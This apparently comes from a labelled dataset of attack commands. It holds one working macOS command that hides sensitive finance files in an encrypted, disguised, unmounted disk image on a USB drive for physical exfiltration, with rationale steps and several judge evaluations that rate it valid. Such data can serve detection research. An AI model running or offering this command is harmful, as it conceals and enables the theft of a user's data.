command: printf 's3cr3tP@ss\n' | hdiutil create -encryption AES-256 -stdinpass -fs HFS+J -volname ".sys_upd" -size 200m /Volumes/USB/.sys_upd.dmg && printf 's3cr3tP@ss\n' | hdiutil attach -stdinpass -nobrowse -mountpoint /Volumes/.sys_upd /Volumes/USB/.sys_upd.dmg && cp -pR ~/Documents/Finance /Volumes/.sys_upd/ && hdiutil detach /Volumes/.sys_upd
explanation: Creates and stealthily mounts an encrypted DMG on an external USB, copies sensitive files into it, then detaches to stage data for physical removal.
rationale_steps: Generate encrypted container on removable media to conceal contents.
Mount with -nobrowse to avoid Finder visibility and casual discovery.
Copy target data locally to the USB image without any network usage.
Detach the image to finalize exfil payload for physical extraction.

llm_judgments.syntactic_justification: Commands are well-formed with balanced quoting, correct use of pipes and &&, and valid hdiutil and cp flags.
llm_judgments.semantic_justification: It creates and mounts an encrypted DMG on a USB with a hidden mountpoint, copies sensitive files, then detaches to stage data for physical removal, aligning with T1052.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper quoting, valid flags for hdiutil, correct command separators (&&), and appropriate piping of the password to both create and attach operations.
llm_judgments.semantic_justification: The command perfectly aligns with T1052 by creating an encrypted container on a USB drive with a hidden mount point, copying sensitive financial data to it, and detaching it for physical exfiltration.

llm_judgments.syntactic_justification: The command is perfectly well-formed, uses valid macOS utilities and flags, includes proper quoting, and correctly chains commands with pipes and logical AND operators.
llm_judgments.semantic_justification: The command perfectly achieves the claimed intent by creating a hidden, encrypted DMG on a USB, stealthily mounting it, copying sensitive files, and then detaching it, directly aligning with T1052 for exfiltration over a physical medium.
